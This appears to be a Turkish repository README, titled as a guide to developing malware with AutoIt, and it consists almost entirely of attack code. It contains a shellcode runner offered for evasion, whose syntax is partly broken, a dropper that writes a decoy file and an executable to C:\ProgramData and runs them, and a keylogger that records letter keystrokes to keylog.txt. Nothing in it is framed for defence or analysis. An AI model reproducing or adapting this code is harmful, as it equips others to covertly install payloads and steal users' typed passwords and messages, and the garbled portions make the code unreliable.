# autoit
Autoit aracı kullanarak zararlı yazılım geliştirme

Atlatma 
-----------------------------------
RunShellCode("binary kod")
Func RunShellCode($SHELLCODE)
$shellcode_buffer = dllstructcreate("BYTE"["Binarylen["0x" & $SHELLCODE) & "]")
$PUT_SHELLCODE_TO_BUFFER = DllStructSetData($SHELLCODE_BUFFER,1,"0x"&$ SHELLCODE)
$SHELLCODE_EXECUTE = DllCall("user32.dll","Iresult",CallWindowProc", "ptr", DllStructGetPtr($SHELLCODE_BUFFER)
EndFunc


Zararlı Yazalım Atlatma
-------------------------------
FileInstall("1.txt","C:\ProgramData\1.txt")
FileInstall("2.exe","C:\ProgramData\2.exe")

ShellExecute("C:\ProgramData\1.txt")
ShellExecute("C:\ProgramData\2.exe")


Keylogger Tuşları txt dosyasına kaydetmeye yarıyor.
-------------------------------------
HotKeySet("a","BasilanTusFonksiyonu")
HotKeySet("b","BasilanTusFonksiyonu")
HotKeySet("c","BasilanTusFonksiyonu")
HotKeySet("d","BasilanTusFonksiyonu")
HotKeySet("e","BasilanTusFonksiyonu")
HotKeySet("f","BasilanTusFonksiyonu")
HotKeySet("g","BasilanTusFonksiyonu")
HotKeySet("h","BasilanTusFonksiyonu")
HotKeySet("ı","BasilanTusFonksiyonu")
HotKeySet("i","BasilanTusFonksiyonu")
HotKeySet("j","BasilanTusFonksiyonu")
HotKeySet("k","BasilanTusFonksiyonu")
HotKeySet("l","BasilanTusFonksiyonu")
HotKeySet("w","BasilanTusFonksiyonu")
HotKeySet("x","BasilanTusFonksiyonu")
HotKeySet("i","BasilanTusFonksiyonu")
HotKeySet("m","BasilanTusFonksiyonu")
HotKeySet("n","BasilanTusFonksiyonu")
HotKeySet("o","BasilanTusFonksiyonu")
HotKeySet("ö","BasilanTusFonksiyonu")
HotKeySet("p","BasilanTusFonksiyonu")
HotKeySet("r","BasilanTusFonksiyonu")
HotKeySet("s","BasilanTusFonksiyonu")
HotKeySet("ş","BasilanTusFonksiyonu")
HotKeySet("t","BasilanTusFonksiyonu")
HotKeySet("u","BasilanTusFonksiyonu")
HotKeySet("ü","BasilanTusFonksiyonu")
HotKeySet("v","BasilanTusFonksiyonu")
HotKeySet("y","BasilanTusFonksiyonu")
HotKeySet("z","BasilanTusFonksiyonu")

Func BasilanTusFonksiyonu()
   FileWrite("keylog.txt",@HotKeyPressed)
   ControlSend("","","",@HotKeyPressed)
EndFunc
While 1
   Sleep(100)
WEnd
